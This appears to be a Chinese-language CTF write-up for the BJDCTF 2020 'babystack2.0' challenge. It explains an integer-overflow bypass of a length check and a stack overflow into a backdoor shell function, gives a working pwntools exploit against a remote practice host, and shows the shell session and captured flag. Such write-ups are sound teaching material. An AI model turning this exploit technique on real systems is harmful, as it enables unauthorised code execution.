# BJDCTF 2020 babystack2.0


# 思路

首先checksec：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230924105435155.png)

发现64位，只开启了NX。

反编译： 

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230924105527316.png)

首先需要输入一个size_t，如果长度小于10才能进read进行泄露。

这里考虑整数溢出绕过判断：

> size_t a =  -1;那么(int) a = -1;但是(unsigned int) a = 4294967295;也就是2^32-1

发现后门函数：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230924110114168.png)

直接调用system('/bin/sh')，地址为400726。

buff的溢出距离是10h，直接写payload了

# exp

> exp中的0x40073A是后门函数的返回地址，这里是为了64位程序的栈平衡。

```python
from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')
#r = process("./babystack") 
r = remote('node4.anna.nssctf.cn', 28925)

offset = 0x10
backdoor = 0x400726

r.sendlineafter('name:', '-1')

payload = b'a' * offset + b'a' * 8 + p64(0x40073A) + p64(backdoor)

r.sendafter('name?', payload)
r.interactive()
```

getshell

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python exp.py
[+] Opening connection to node4.anna.nssctf.cn on port 28925: Done
/home/kali/Desktop/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter('name:', '-1')
/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x22 bytes:
    b'*' * 0x22
[DEBUG] Received 0xc6 bytes:
    b'\n'
    b'*     Welcome to the BJDCTF!     *\n'
    b'* And Welcome to the bin world!  *\n'
    b"*  Let's try to pwn the world!   *\n"
    b'* Please told me u answer loudly!*\n'
    b'[+]Are u ready?\n'
    b'[+]Please input the length of your name:\n'
[DEBUG] Sent 0x3 bytes:
    b'-1\n'
/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py:831: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x11 bytes:
    b"[+]What's u name?"
[DEBUG] Sent 0x28 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  3a 07 40 00  00 00 00 00  │aaaa│aaaa│:·@·│····│
    00000020  26 07 40 00  00 00 00 00                            │&·@·│····│
    00000028
[*] Switching to interactive mode
[DEBUG] Received 0x1 bytes:
    b'\n'

$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x6d bytes:
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'flag\n'
    b'flag.txt\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'pwn\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
dev
etc
flag
flag.txt
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2d bytes:
    b'NSSCTF{2ff0f50c-8003-461f-9458-8358f6a736bf}\n'
NSSCTF{2ff0f50c-8003-461f-9458-8358f6a736bf}
$ 
[*] Interrupted
[*] Closed connection to node4.anna.nssctf.cn port 28925
```



---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/09/2020babystack2-0/  

